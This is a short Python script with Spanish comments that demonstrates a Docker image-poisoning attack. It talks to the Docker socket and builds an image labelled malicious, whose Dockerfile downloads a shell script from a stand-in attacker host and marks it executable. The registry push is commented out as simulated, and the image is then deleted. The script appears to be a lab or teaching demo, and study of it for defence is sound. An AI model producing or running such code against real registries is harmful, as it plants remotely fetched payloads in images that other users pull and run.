import docker
import os

def image_poisoning_attack():
    try:
        client = docker.DockerClient(base_url='unix:///var/run/docker.sock')
        
        # Crear Dockerfile malicioso
        malicious_dockerfile = """
        FROM alpine:latest
        RUN echo 'Hacked by Image Poisoning!' > /root/malware.txt
        RUN wget http://attacker.com/malware.sh -O /root/malware.sh && chmod +x /root/malware.sh
        CMD ["/bin/sh"]
        """
        
        # Escribir Dockerfile
        with open("Dockerfile.malicious", "w") as f:
            f.write(malicious_dockerfile)
        
        # Construir imagen maliciosa
        image, build_logs = client.images.build(
            path=".",
            dockerfile="Dockerfile.malicious",
            tag="malicious:latest"
        )
        
        print("[+] Imagen maliciosa construida")
        print(f"[+] ID: {image.id}")
        
        # Empujar a registro (simulado)
        # client.images.push("malicious:latest")
        
        # Limpiar
        os.remove("Dockerfile.malicious")
        client.images.remove(image.id)
        
    except Exception as e:
        print(f"[-] Error: {str(e)}")

if __name__ == "__main__":
    image_poisoning_attack()